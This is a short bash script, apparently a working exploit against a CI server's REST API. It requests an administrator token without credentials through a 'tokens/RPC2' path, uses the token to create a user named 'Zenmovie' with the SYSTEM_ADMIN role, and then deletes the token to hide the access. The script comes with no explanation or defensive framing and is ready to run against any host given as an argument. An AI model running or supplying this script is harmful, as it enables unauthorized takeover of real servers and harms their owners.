#!/bin/bash

if [ "$#" -ne 2 ]; then
    echo "Usage: $0 <base_url> <port>"
    exit 1
fi

BASE_URL="$1"
PORT="$2"

TOKEN_ENDPOINT="${BASE_URL}:${PORT}/app/rest/users/id:1/tokens/RPC2"
CREATE_USER_ENDPOINT="${BASE_URL}:${PORT}/app/rest/users"

TOKEN_RESPONSE=$(curl -X POST "$TOKEN_ENDPOINT")
BEARER_TOKEN=$(echo "$TOKEN_RESPONSE" | grep -oP 'value="\K[^"]+')

curl -X POST "$CREATE_USER_ENDPOINT" \
     -H "Content-Type: application/json" \
     --data '{"username": "Zenmovie", "password": "Zenmovie", "email": "Zenmovie", "roles": {"role": [{"roleId": "SYSTEM_ADMIN", "scope": "g"}]}}' \
     -H "Authorization: Bearer $BEARER_TOKEN" 1>/dev/null

curl -s -X DELETE "$TOKEN_ENDPOINT" -H "Authorization: Bearer ${BEARER_TOKEN}"

echo "login: Zenmovie password: Zenmovie"
